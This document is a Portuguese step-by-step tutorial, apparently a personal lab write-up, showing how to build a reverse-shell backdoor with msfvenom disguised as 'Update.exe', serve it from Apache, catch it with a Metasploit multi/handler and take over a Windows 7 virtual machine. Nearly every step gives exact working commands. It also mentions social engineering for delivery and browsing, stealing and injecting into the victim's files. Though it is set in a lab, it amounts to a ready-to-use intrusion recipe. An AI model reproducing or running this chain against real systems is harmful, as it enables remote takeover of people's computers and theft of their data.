## Criando um backdoor embarcado em um executável e testando o ataque em uma VM (Virtual Machine) do Windows 7.

### 1º - Abrir o Kali Linux e o Windows 7 na VM. 

### 2º - Pegar o IP do Windows no terminal do Windows acionando o comando ipconfig.

![ip windows](https://i.imgur.com/P4d0QSj.jpeg)

&nbsp;

### 3º - Descobrir o enderenço de IP da minha máquina no Terminal Kali Linux

Comando: ip addr

![ip maquina](https://i.imgur.com/jqJ6Eav.jpeg)

&nbsp;

### 4º - Criar um executável malicioso no Terminal Kali Linux

Comando: msfvenom -p windows/meterpreter/reverse_tcp -a x86 platform windows -f exe LHOST=192.168.56.102 LPORT=4444 -o Update.exe 

Sendo:

msfvenom = módulo que cria um executável malicioso

-p = define qual é o payload. Nesse caso é um payload voltado para o windows que é o meterpreter que tem um módulo de tcp reverse, ou shell reverse, que é o controle de dispositivos de forma remota onde o usuário clica e executa um software malicioso.

-a x86 platform windows = define a arquitetura. Quando eu defino x86 ou x64 estou definindo qual processador que vai poder executar. No nosso caso o x86 roda em 32 e 64 bits, e ele é focado na plataforma windows, ou seja, é um executável pro windows.

-f exe LHOST=192.168.56.102 = define o tipo de arquivo, que no nosso caso é o exe. Quando esse arquivo for executado, ele vai me conectar com meu computador, que é o LOCAL HOST. 

LPORT = Define uma porta. Pode ser qualquer número, no nosso caso escolhi 4444

-o = Saída (output) que é um executável, que no nosso caso é o Update.exe 

![msfvenom](https://i.imgur.com/DrRd1Bt.jpeg)

Tendo criado este executável, temos que pensar em como enviá-lo para o usuário. Geralmente é através de engenharia social. 

&nbsp;

### 5º - Agora precisamos hospedar este executável num servidor Apache.

Comando: service apache2 start

![service apache](https://i.imgur.com/RUFMZkj.jpeg)

&nbsp;

### 6º - Em seguida criar o diretório do Apache, ou seja, quando eu acessar minha página ela estará dentro desse diretório html.

Comando: sudo cp Update.exe /var/www/html

![sudo cp](https://i.imgur.com/6CT47wd.jpeg)

&nbsp;

### 7º - Acessar o diretório criado e acionar o comando ls para visualizar os arquivos. 

Comando: cd /nome/do/diretorio

Comando: ls

![cd ls](https://i.imgur.com/jxY4dSz.jpeg)

Ao acessá-lo visualizaremos o executável Update.exe que criamos como cópia com o comando cp no diretório Apache. Ao acessá-lo através do navegador do alvo eu vou procurar por este arquivo executável dentro do diretório Apache.

&nbsp;

### 8º - No navegador do Windows, baixar o executável pesquisando pelo comando abaixo:

Comando: http://nú.me.ro.ip.da.máquina/Update.exe

Nesse caso seria http://192.168.56.102/Update.exe 

O número IP precisa ser o número da máquina onde criei o executável, neste caso é o ip da VM do Kali Linux. NÃO EXECUTAR O ARQUIVO AINDA, apenas salvar na pasta downloads por enquanto.

![http ip](https://i.imgur.com/ujrLrIS.jpeg)

&nbsp;

### 9º - Em seguida acessar o metasploit no terminal do Kali, para que possamos ativar o meterpreter para gerar a sessão com o usuário.

Comando: msfconsole

![msfconsole](https://i.imgur.com/GTuQJxe.jpeg)

&nbsp;

### 10º - Em seguida rodar o módulo do TCP/Shell reverso, pra fazer o comando da máquina remota.

Comando: use multi/handler

![use multi handler](https://i.imgur.com/fqj5rRG.jpeg)

&nbsp;

### 11º - Em seguida, definir o payload abaixo.

Comando: set payload windows/meterpreter/reverse_tcp 

![set payload](https://i.imgur.com/Kuopv94.jpeg)

&nbsp;

### 12º - Visualizar as informações desse último payload criado, se quiser.

Comando: info

![info payload](https://i.imgur.com/btFdReH.jpeg)

&nbsp;

### 13º - Em seguida, executar os comandos pra definir o LHOST e o LPORT pro meterpreter, que é quem vai "escutar" essa comunicação. O arquivo executável é como se fosse um cliente e com esses comandos estou definindo meu servidor.

Comando: set LHOST 192.168.56.102 (ip da minha máquina)

Comando: set LPORT 4444 (porta que escolhi ao criar o executável)

![lhost lport](https://i.imgur.com/laknBoP.jpeg)

&nbsp;

### 14º - Na sequência rodar o comando run para abrir nosso servidor e aguardar uma comunicação da máquina-alvo.

Comando: run

![run](https://i.imgur.com/M4SrGI5.jpeg)

&nbsp;

### 15º - Em seguida voltar na VM do Windows, rodar o arquivo Update.exe que salvamos na pasta Downloads e visualizar a abertura de sessão (invasão) com o meterpreter no Kali Linux.

![acesso bem sucedido](https://i.imgur.com/rCDmud9.jpeg)

&nbsp;

### 16º - Após invadir o windows, podemos navegar pelos diretórios e arquivos dele através da nossa máquina no Kali. Se eu rodar o comando dir eu consigo visualizar a pasta de Downloads do Windows, e posso navegar por ele através de comandos como cd .., ls, até chegar na pasta do sistema, onde é possível pegar dados, baixar arquivos, injetar script, etc.

![dir1](https://i.imgur.com/3g2NsgK.jpeg)

![dir2](https://i.imgur.com/T64WxeB.jpeg)

![dir3](https://i.imgur.com/rEWLMCB.jpeg)

&nbsp;
